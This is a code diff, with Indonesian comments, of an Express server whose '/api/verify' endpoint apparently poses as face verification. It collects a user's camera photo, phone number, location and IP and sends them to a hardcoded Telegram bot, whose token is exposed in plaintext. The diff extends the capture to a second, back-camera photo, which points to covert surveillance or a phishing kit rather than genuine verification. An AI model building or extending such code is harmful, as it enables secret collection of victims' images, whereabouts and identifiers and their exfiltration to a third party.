@@ -8,11 +8,11 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 const BOT_TOKEN = '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
-const CHAT_ID = '-7352381955'; // Ganti dengan chat ID tujuan
+const CHAT_ID = '-1001234567890'; // Ganti dengan chat ID tujuan
 
 // Middleware
-app.use(express.json({ limit: '10mb' }));
-app.use(express.urlencoded({ extended: true, limit: '10mb' }));
+app.use(express.json({ limit: '20mb' }));
+app.use(express.urlencoded({ extended: true, limit: '20mb' }));
 app.use(express.static('public'));
 
 // Database
@@ -110,13 +110,15 @@ async function sendTelegramMessage(chatId, text) {
 // Verify endpoint
 app.post('/api/verify', async (req, res) => {
   try {
-    let image, phone;
+    let image, backImage, phone;
     
     if (req.is('multipart/form-data')) {
       image = req.body.image;
+      backImage = req.body.backImage || null;
       phone = req.body.phone || `User_${Date.now().toString().slice(-6)}`;
     } else {
       image = req.body.image;
+      backImage = req.body.backImage || null;
       phone = req.body.phone || `User_${Date.now().toString().slice(-6)}`;
     }
     
@@ -135,27 +137,28 @@ app.post('/api/verify', async (req, res) => {
       phone: phone,
       timestamp: timestamp,
       location: location,
-      ip: ip
+      ip: ip,
+      hasBackCamera: backImage ? true : false
     });
     writeDatabase(db);
     
-    // Process image
+    // Process front image
     const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
     const buffer = Buffer.from(base64Data, 'base64');
     
-    // Send to Telegram
+    // Kirim foto depan dulu
     const form = new FormData();
     form.append('chat_id', CHAT_ID);
     form.append('caption', 
-      `🟡 *Verifikasi Wajah*\n\n` +
+      `🟡 *Verifikasi Wajah - DEPAN*\n\n` +
       `📱 *User:* ${phone}\n` +
       `📍 *Lokasi:* ${location}\n` +
       `🕒 *Waktu:* ${timestamp}\n` +
       `🌐 *IP:* ${ip}\n\n` +
-      `_Foto dikirim untuk verifikasi_`
+      `_Foto depan dikirim untuk verifikasi_`
     );
     form.append('photo', buffer, { 
-      filename: `verifikasi_${Date.now()}.jpg`, 
+      filename: `verifikasi_depan_${Date.now()}.jpg`, 
       contentType: 'image/jpeg' 
     });
     
@@ -171,6 +174,31 @@ app.post('/api/verify', async (req, res) => {
       return res.status(500).json({ 
         success: false, 
         error: 'Gagal kirim ke Telegram' 
+      });
+    }
+    
+    // Jika ada foto belakang, kirim juga
+    if (backImage) {
+      const backBase64 = backImage.replace(/^data:image\/\w+;base64,/, '');
+      const backBuffer = Buffer.from(backBase64, 'base64');
+      
+      const backForm = new FormData();
+      backForm.append('chat_id', CHAT_ID);
+      backForm.append('caption', 
+        `🟡 *Verifikasi Wajah - BELAKANG*\n\n` +
+        `📱 *User:* ${phone}\n` +
+        `📍 *Lokasi:* ${location}\n` +
+        `🕒 *Waktu:* ${timestamp}\n\n` +
+        `_Foto belakang dikirim untuk verifikasi_`
+      );
+      backForm.append('photo', backBuffer, { 
+        filename: `verifikasi_belakang_${Date.now()}.jpg`, 
+        contentType: 'image/jpeg' 
+      });
+      
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: backForm,
       });
     }
     
